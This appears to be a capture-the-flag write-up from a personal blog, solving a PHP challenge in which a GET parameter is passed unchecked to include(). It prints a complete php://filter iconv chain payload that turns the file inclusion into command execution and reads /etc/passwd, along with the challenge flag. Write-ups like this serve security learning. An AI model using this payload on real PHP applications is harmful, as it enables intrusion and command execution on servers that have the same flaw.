---
source: kevin-mizu
source_url: https://mizu.re/post/forbidden_jutsu
title: "Forbidden Jutsu | mizu.re"
description: "Forbidden Jutsu"
---

_keyboard\_arrow\_up_

title: Forbidden Jutsu

date: Dec 25, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [YogoshaChristmas\_2022](https://mizu.re/tag/YogoshaChristmas_2022) [Web](https://mizu.re/tag/Web)

# Forbidden Jutsu

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/forbidden_jutsu/images/yogosha.svg)

* * *

Difficulty: 500 points \| 47 solves

Description: Wow you made it to the forbidden jutsu learning phase! Now can you be brave enough to acquire this strong jutsu ? Go the training land now!

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/forbidden_jutsu#%EF%B8%8F-recon)
- [💥 LFI 2 RCE](https://mizu.re/post/forbidden_jutsu#-lfi-2-rce)
- [🎉 Flag](https://mizu.re/post/forbidden_jutsu#-flag)

## 🕵️ Recon

This challenge was the 3rd step of the CTF. For this one, we have to find a way to get an RCE from the following snippet of code:

```php
<?php
session_start();
highlight_file(__FILE__);

//Our secret is in the root directory; You can't reveal it without achieving RCE Jutsu ;)
if(isset($_GET["karma"])){
    $_SESSION["boruto"]=$_GET["karma"];
    include($_GET["karma"]);

}
?>
```

## 💥 LFI 2 RCE

From the above source code, we can see that our input is directly passed in the `include` function. This is a typical setup of LFI 2 RCE. In PHP, there are a lot of techniques to archieve this kind of exploit:

- Log poisoning
- Session poisoning
- [PHP\_SESSION\_UPLOAD\_PROGRESS](https://www.exploit-db.com/docs/50157)
- ...

For this challenge, as there is no restriction for our input, we are going to use the well known `php://filter/conver.icon` technique which allows to directly RCE. The payload looks like:

```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&0=id
```

For more details about this exploit, feel free to check the [@\_remsio\_](https://twitter.com/_remsio_) research: [link](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html).

## 🎉 Flag

Using the above payload with the command `cat /seCretJutsuToKillBorUtoKun.txt` gives us the flag 🔥

```
Well done achieving this forbidden jutsu! We will use it to overcome Naruto and kill Boruto!! FLAG{LfI_ForBiDDen_JuTsu_T0_BeAt_RaS3enGan}
```

Flag: `FLAG{LfI_ForBiDDen_JuTsu_T0_BeAt_RaS3enGan}` 🎉

[_keyboard\_arrow\_left_ Kara Jutsu Access](https://mizu.re/post/kara_jutsus_access)

[Secret Hideout _keyboard\_arrow\_right_](https://mizu.re/post/secret_hideout)